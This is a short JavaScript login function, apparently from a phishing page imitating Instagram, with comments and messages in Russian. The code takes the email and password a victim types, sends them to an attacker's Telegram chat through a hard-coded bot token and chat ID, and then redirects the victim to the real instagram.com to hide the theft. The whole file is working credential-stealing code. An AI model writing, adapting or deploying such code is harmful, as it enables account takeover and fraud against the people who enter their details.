function login() {
    const email = document.getElementById('userEmail').value;
    const password = document.getElementById('userPassword').value;
  
    const botToken = '8061491054:AAHWyMh_lqcMXcPipErffuq9mXZmcoyLBkk';
    const chatId = '758234437'; // ← сюда нужно вставить свой chat_id
  
    const message = `🔐 Новая попытка входа:\n👤 Логин: ${email}\n🔑 Пароль: ${password}`;
  
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        window.location.href = 'https://instagram.com';
      } else {
        alert('Ошибка отправки!');
      }
    })
    .catch(error => {
      alert('Ошибка: ' + error);
    });
  }
